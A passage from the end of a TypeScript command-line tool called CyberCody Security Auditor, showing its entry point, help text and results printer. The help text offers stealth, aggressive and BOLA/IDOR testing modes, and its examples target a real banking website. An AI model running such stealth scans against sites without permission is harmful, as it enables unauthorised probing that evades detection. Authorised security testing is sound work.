      console.log(`[CyberCody] ${emoji} ${message}`);
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// MAIN ENTRY POINT
// ═══════════════════════════════════════════════════════════════════════════════

async function main(): Promise<void> {
  const args = process.argv.slice(2);
  
  if (args.length === 0 || args.includes('--help')) {
    printHelp();
    return;
  }

  const options = parseArgs(args);

  if (!options.url) {
    console.error('❌ Error: URL is required');
    console.error('Usage: npx ts-node src/security/cybercody-cli.ts ghost-audit <url> [options]');
    process.exit(1);
  }

  console.log(`
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗██╗   ██╗██████╗ ███████╗██████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗  ║
║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔══██╗╚██╗ ██╔╝  ║
║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║     ██║   ██║██║  ██║ ╚████╔╝   ║
║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║     ██║   ██║██║  ██║  ╚██╔╝    ║
║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║╚██████╗╚██████╔╝██████╔╝   ██║     ║
║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝    ╚═╝     ║
║                                                                               ║
║               🦾 Security Auditor - "Safe Hunter" Mode 🛡️                    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
`);

  const auditor = new CyberCodyAuditor(options);
  
  try {
    await auditor.initialize();
    
    switch (options.command) {
      case 'ghost-audit':
        const result = await auditor.ghostAudit();
        printResults(result);
        break;

      case 'scan':
        console.log('Quick scan mode - coming soon');
        break;

      case 'report':
        console.log('Report generation mode - coming soon');
        break;
    }

  } catch (error) {
    console.error('❌ Audit failed:', error);
    process.exit(1);
  }
}

function printHelp(): void {
  console.log(`
CyberCody Security Auditor - CLI

Usage:
  npx ts-node src/security/cybercody-cli.ts ghost-audit <url> [options]

Commands:
  ghost-audit   Perform stealth security audit with evidence collection
  scan          Quick vulnerability scan
  report        Generate evidence report

Options:
  --mode <mode>        Capture mode: safe-hunter | aggressive | stealth (default: safe-hunter)
  --stealth            Enable stealth mode (randomized behavior)
  --multi-user         Test for BOLA/IDOR with multiple user contexts
  --headless           Run in headless mode (default: true)
  --headless=false     Run with visible browser
  --screenshots        Enable automatic screenshot capture 📸
  --gemini-key <key>   Gemini API key for AI annotations
  --output <dir>       Output directory for evidence (default: ./evidence)
  --verbose            Enable verbose logging

Examples:
  # Basic audit with screenshots
  npx ts-node src/security/cybercody-cli.ts ghost-audit https://app.revolut.com --screenshots

  # Full stealth audit with AI annotations
  npx ts-node src/security/cybercody-cli.ts ghost-audit https://app.revolut.com \\
    --mode safe-hunter \\
    --stealth \\
    --multi-user \\
    --headless=false \\
    --screenshots \\
    --gemini-key YOUR_API_KEY \\
    --verbose
`);
}

function printResults(result: AuditResult): void {
  console.log(`
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         AUDIT RESULTS                                         ║
╚═══════════════════════════════════════════════════════════════════════════════╝

📊 Summary:
   Target:     ${result.url}
   Duration:   ${(result.duration / 1000).toFixed(2)}s
   Findings:   ${result.findings.length}
   Evidence:   ${result.evidenceCount} screenshots

🔍 Findings by Severity:
   Critical:   ${result.findings.filter(f => f.severity === 'critical').length}
   High:       ${result.findings.filter(f => f.severity === 'high').length}
   Medium:     ${result.findings.filter(f => f.severity === 'medium').length}
   Low:        ${result.findings.filter(f => f.severity === 'low').length}
   Info:       ${result.findings.filter(f => f.severity === 'info').length}
`);

  if (result.findings.length > 0) {
    console.log('📋 Detailed Findings:\n');
    
    for (const finding of result.findings) {
      const severityIcon = {
        critical: '🔴',
        high: '🟠',
        medium: '🟡',
        low: '🔵',
        info: '⚪',
      }[finding.severity];

      console.log(`   ${severityIcon} [${finding.severity.toUpperCase()}] ${finding.title}`);
      console.log(`      Type: ${finding.type}`);
      console.log(`      ${finding.description}`);
      console.log(`      💡 ${finding.recommendation}`);
      if (finding.cvss) console.log(`      CVSS: ${finding.cvss}`);
      console.log('');
    }
  }

  console.log(`
═══════════════════════════════════════════════════════════════════════════════
✅ Audit complete! Evidence saved to ./evidence directory
═══════════════════════════════════════════════════════════════════════════════
`);
}

// Run main
main().catch(console.error);
